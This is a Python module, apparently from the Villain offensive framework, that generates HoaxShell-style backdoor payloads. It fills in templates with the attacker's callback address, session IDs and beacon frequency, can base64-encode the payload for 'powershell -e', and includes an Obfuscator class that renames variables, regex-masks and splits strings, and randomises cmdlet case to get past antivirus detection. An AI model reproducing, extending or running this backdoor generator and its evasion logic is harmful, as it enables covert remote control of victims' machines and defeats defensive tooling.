#!/usr/bin/env python3
#
# Author: Panagiotis Chartas (t3l3machus)
#
# This script is part of the Villain framework:
# https://github.com/t3l3machus/Villain

#import netifaces as ni
from warnings import filterwarnings
from random import randint, choice, randrange
from copy import deepcopy
from ipaddress import ip_address
#from core.villain.settings import Hoaxshell_settings
from uuid import uuid4
import re
import os

filterwarnings("ignore", category=DeprecationWarning)
cwd = os.path.dirname(os.path.abspath(__file__))


class payloadGen:

    def __init__(self, opSys, iface, scramble:int=1):

        self.obfuscator = Obfuscator()

        self.boolean_args = {
            'encode': False,
            'obfuscate': False,
            'constraint_mode': False
        }

        self.supported = {
            'linux': ['domain'],
            'windows': ['domain', 'encode', 'obfuscate', 'constraint_mode', 'exec_outfile']
        }

        self.payload = self.generate_payload(opSys, iface)
        self.obfuscated = self.obfuscator.maskPayload(self.payload)
        self.scrambled = self.obfuscator.scrambleString(self.payload, scramble)

    def encodeUTF16(self, payload):
        enc_payload = "powershell -e " + \
            base64.b64encode(payload.encode('utf16')[2:]).decode()
        return enc_payload

    def arg2Dict(self, args_list):
        args_dict = {}

        for arg in args_list:

            try:
                tmp = arg.split("=")
                args_dict[tmp[0].lower()] = tmp[1]

            except:
                args_dict[tmp[0].lower()] = True

        return args_dict

    def readFile(self, path):

        f = open(path, 'r')
        content = f.read()
        f.close()
        return content

    def generate_payload(self, operatingSystem:str, lhost:str):

        payloadPwd = f"{cwd}/payloads/{operatingSystem}"

        try:

            boolean_args = deepcopy(self.boolean_args)
            args_dict = {"os": operatingSystem, "lhost": lhost}  # technically cheating
            arguments = args_dict.keys()

            #print(args_dict)
            
            """
            if not args_dict:
                print(f'Error parsing arguments. Check your input and try again.')
                return
            """
                    

            ''' Parse OS '''
            if 'os' in arguments:
                if args_dict['os'].lower() in ['windows', 'linux', 'macos']:
                    os_type = args_dict['os'].lower()
                    del args_dict['os']
                
                else:
                    print('Unsupported OS type.')
                    return        
                
            else:
                print('Required argument OS not provided.')
                return
        
            
            ''' Parse LHOST '''
            if ('lhost' in arguments):
                
                try:
                    # Check if valid IP address
                    lhost = str(ip_address(args_dict['lhost']))
                    
                except ValueError:
                    
                    try:
                        # Check if valid interface
                        lhost = ni.ifaddresses(args_dict['lhost'])[ni.AF_INET][0]['addr']
                        
                    except:
                        print('Error parsing LHOST. Invalid IP or Interface.')
                        return
                
                del args_dict['lhost']
                
            else:
                
                if (not Hoaxshell_settings.ssl_support) or ('domain' not in arguments):
                    print('Required argument LHOST not provided.') if not Hoaxshell_settings.ssl_support \
                    else print('Required argument LHOST or DOMAIN not provided.')
                    return
                
            #frequency = Hoaxshell_settings.default_frequency

            frequency = 0.2
            

            ''' Parse EXEC_OUTFILE '''        
            if 'exec_outfile' in arguments:
                
                if 'exec_outfile' in self.supported[args_dict['os']]:
                    exec_outfile = args_dict['exec_outfile']
                        
                else:                    
                    exec_outfile = False
                    print(f'Ignoring argument "exec_outfile" (not supported for {args_dict["os"]} payloads)')
                
                del args_dict['exec_outfile']
                
            else:
                exec_outfile = False



            ''' Parse DOMAIN '''        
            if 'domain' in arguments:
                
                if not Hoaxshell_settings.ssl_support:
                    domain = False
                    print('Hoaxshell server must be started with SSL support to use a domain.')
                    return
                
                if 'domain' in self.supported[args_dict['os']]:
                    domain = args_dict['domain']
                        
                else:                    
                    domain = False
                    print(f'Ignoring argument "domain" (not supported for {args_dict["os"]} payloads)')
                
                del args_dict['domain']
                
            else:
                domain = False

            # temporary
            class Hoaxshell_settings:
                bind_address = '0.0.0.0'
                bind_port = 8080
                bind_port_ssl = 443
                ssl_support = None

                # Server response header definition
                server_version = 'Apache/2.4.1'
                
                # Header name of the header that carries the backdoor's session ID
                _header = 'Authorization'
                
                # Beacon frequency of the generated backdoor shells
                default_frequency = 0.8
                
                # Generate self signed cert:
                # openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
                certfile = False # Add path to cert.pem here for SSL or pass it as argument
                keyfile = False  # Add path to priv_key.pem here for SSL or pass it as argument



            ''' Parse BOOLEAN '''            
            for item in boolean_args.keys():
                if item in arguments:
                    if item in self.supported[os_type]:
                        boolean_args[item] = True
                        del args_dict[item]
                        
                    else:
                        print(f'Ignoring argument "{item}" (not supported for {os_type} payloads)')
        
            
            if (os_type == 'linux'):
                boolean_args['constraint_mode'] = True
                boolean_args['trusted_domain'] = False
            
            
            # Create session unique id
            verify = str(uuid4())[0:8]
            get_cmd = str(uuid4())[0:8]
            post_res = str(uuid4())[0:8]
            hid = str(uuid4()).split("-")
            header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not Hoaxshell_settings._header else Hoaxshell_settings._header
            session_unique_id = '-'.join([verify, get_cmd, post_res])

            # Define lhost
            if not domain:
                lhost = f'{lhost}:{Hoaxshell_settings.bind_port}' if not Hoaxshell_settings.ssl_support \
                else f'{lhost}:{Hoaxshell_settings.bind_port_ssl}'
            else:
                lhost = f'{domain}:{Hoaxshell_settings.bind_port_ssl}'

            # Select base template
            if Hoaxshell_settings.ssl_support:
                payload = self.readFile(f'{payloadPwd}/https_payload') \
                if not exec_outfile else self.readFile(f'{payloadPwd}/https_payload_outfile')                                      
            else:
                payload = self.readFile(f'{payloadPwd}/http_payload') \
                if not exec_outfile else self.readFile(f'{payloadPwd}/http_payload_outfile')
            
            # Process payload template 
            payload = payload.replace('*SERVERIP*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
                frequency)).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id).strip()
                        
            if exec_outfile:
                payload = payload.replace("*OUTFILE*", args_dict['exec_outfile'])
            
            if boolean_args['constraint_mode'] and os_type == 'windows':
                payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")

            if not domain and Hoaxshell_settings.ssl_support and os_type == 'windows':
                disable_ssl_chk = self.readFile(f'{payloadPwd}/disable_ssl_check')
                payload = payload.replace('*DISABLE_SSL_CHK*', disable_ssl_chk)
            
            elif domain and Hoaxshell_settings.ssl_support:
                payload = payload.replace('*DISABLE_SSL_CHK*', '')
            
        except:
            raise
        
        for item in args_dict.keys():
            print(f'Ignoring unrecognized argument "{item}".')
            
        payload = self.obfuscator.mask_payload(payload) if boolean_args['obfuscate'] else payload
        payload = self.encodeUTF16(payload) if boolean_args['encode'] else payload
        del boolean_args
        
        return payload


class Obfuscator:
    
    def __init__(self):
        
        self.restricted_var_names = ['t', 'tr', 'tru', 'true', 'e', 'en', 'env']
        self.used_var_names = []

    
    
    def mask_char(self, char):
        
        path = randint(1,3)
            
        if char.isalpha():
            
            if path == 1: 
                return char
            
            return '\w' if path == 2 else f'({char}|\\?)'
        
        
        
        elif char.isnumeric():

            if path == 1: 
                return char
            
            return '\d' if path == 2 else f'({char}|\\?)'
        
        
        
        elif char in '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~':
            
            if char in ['$^*\\+?']:
                char = '\\' + char
                
            if path == 1: 
                return char
            
            return '\W' if path == 2 else f'({char}|\\?)'
        
        else:
            return None



    def randomCase(self, string):
        return ''.join(choice((str.upper, str.lower))(c) for c in string)


    
    def str2regex(self, string):
        
        # First check if string is actually a regex
        if re.match( "^\[.*\}$", string):
            return string
            
        else:
            
            legal = False
            
            while not legal:
                regex = ''
                str_length = len(string)
                chars_used = 0
                c = 0
                
                while True:

                    chars_left = (str_length - chars_used)            
                    
                    if chars_left:
                        
                        pair_length = randint(1, chars_left)
                        regex += '['
                        
                        for i in range(c, pair_length + c):

                            masked = self.mask_char(string[i])
                            regex += masked
                            c += 1
                            
                        chars_used += pair_length
                        
                        regex += ']{' + str(pair_length) + '}'

                    else:
                        break
                
                # Test generated regex
                if re.match(regex, string):
                    legal = True
            
            return regex



    def concatenate_string(self, string):
        
        str_length = len(string)
        
        if str_length <= 1:
            return string
            
        concat = ''
        str_length = len(string)
        chars_used = 0
        c = 0
        
        while True:

            chars_left = (str_length - chars_used)            
            
            if chars_left:
                
                pair_length = randint(1, chars_left)
                concat += "'"
                
                for i in range(c, pair_length + c):

                    concat += string[i]
                    c += 1
                    
                chars_used += pair_length                
                concat = (concat + "'+") if (chars_used < str_length) else (concat + "'")

            else:
                break    
    
        return concat



    def get_random_str(self, main_str, substr_len):
        
        index = randrange(1, len(main_str) - substr_len + 1) 
        return main_str[index : (index + substr_len)]



    def obfuscate_cmdlet(self, main_str):
        
        main_str_length = len(main_str)
        substr_len = main_str_length - (randint(1, (main_str_length - 2)))
        sub = self.get_random_str(main_str, substr_len)
        sub_quoted = f"'{sub}'"
        obf_cmdlet = main_str.replace(sub, sub_quoted)
        return obf_cmdlet        



    def get_rand_var_name(self):
        
        _max = randint(1,6)
        legal = False
        
        while not legal:
            
            obf = str(uuid4())[0:_max]
            
            if (obf in self.restricted_var_names) or (obf in self.used_var_names):
                continue
                
            else:
                self.used_var_names.append(obf)
                legal = True
        
        return obf
        
    def scrambleString(self, payload, interchange:int=1):
        strings = payload.split(";")

        interchangables = { 
            # known strings that you can interchange and the script would still work, by index
            #ex: swap 0 with 1 and 1 with 0
            3:1,
            2:3
        }

        for x in range(interchange):
            x = choice(list(interchangables))

            '''
            interchangables = {0:1}
            x = 0
            strings[x] will return index 0
            strings[interchangables[x]] will return index 1
            '''
            i1, i2 = strings[x], strings[interchangables[x]]

            strings[x] = i2
            strings[interchangables[x]] = i1
            
        return ';'.join(strings)
            

    def maskPayload(self, payload):
        
        # Obfuscate variable name definitions
        variables = re.findall("\$[A-Za-z0-9_]*={1}", payload)
        
        if variables:
                        
            for var in variables:                
                var = var.strip("=")    
                obf = self.get_rand_var_name()
                payload = payload.replace(var, f'${obf}')


        # Randomize error variable name
        obf = self.get_rand_var_name()
        payload = payload.replace('-ErrorVariable e', f'-ErrorVariable {obf}')
        payload = payload.replace('$e+', f'${obf}+')
        
        
        # Obfuscate strings
        strings = re.findall(r"'(.+?)'", payload)
        
        if strings:
            for string in strings:
                
                if string in ['None', 'quit']:
                    string = string.strip("'")
                    concat = self.concatenate_string(string)                    
                    payload = payload.replace(f"'{string}'", f'({concat})')
                
                elif string not in ['', ' ']:
                    
                    method = randint(0, 1)
                        
                    if method == 0: # String to regex
                        
                        _max = randint(3,8)
                        random_string = str(uuid4())[0:_max]                
                        regex = self.str2regex(random_string)
                        replace_obf = self.randomCase('-replace')
                        payload = payload.replace(f"'{string}'", f"$('{random_string}' {replace_obf} '{regex}','{string}')")
                    
                    elif method == 1: # Concatenate string
                        
                        submethod = randint(0, 1)
                        string = string.strip("'")
                        concat = self.concatenate_string(string)
                        
                        if submethod == 0: # return raw
                            payload = payload.replace(f"'{string}'", concat)
                            
                        elif submethod == 1: # return call
                            payload = payload.replace(f"'{string}'", f"$({concat})")
                    
        
                    
        # Randomize the case of each char in parameter names
        ps_parameters = re.findall("\s-[A-Za-z]*", payload)

        if ps_parameters:        
            for param in ps_parameters:            
                param = param.strip()
                rand_param_case = self.randomCase(param)
                payload = payload.replace(param, rand_param_case)



        # Spontaneous replacements
        alternatives = {
            'Invoke-WebRequest' : 'iwr',
            'Invoke-Expression' : 'iex',
            'Invoke-RestMethod' : 'irm'
        }
        
        for alt in alternatives.keys():
            
            p = randint(0,1)
            
            if p == 0:
                payload = payload.replace(alt, alternatives[alt])
                
            else:
                pass



        
        components = ['USERNAME', 'COMPUTERNAME', 'Out-String', 'Invoke-WebRequest', 'iwr', \
        'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', \
        'Invoke-RestMethod', 'irm', 'Start-Process', 'Hidden', 'add-type']
        
        # Randomize char case of specified components    
        for i in range(0, len(components)):
            rand_case = self.randomCase(components[i])
            payload = payload.replace(components[i], rand_case)
            components[i] = rand_case
        
        
        # Obfuscate specified components
        for i in range(0, len(components)):
            if (components[i].count('.') == 0) and components[i].lower() not in ['while', 'username', 'computername']:
                obf_cmdlet = self.obfuscate_cmdlet(components[i])
                payload = payload.replace(components[i], obf_cmdlet)
        
        self.used_var_names = []
        return payload
        


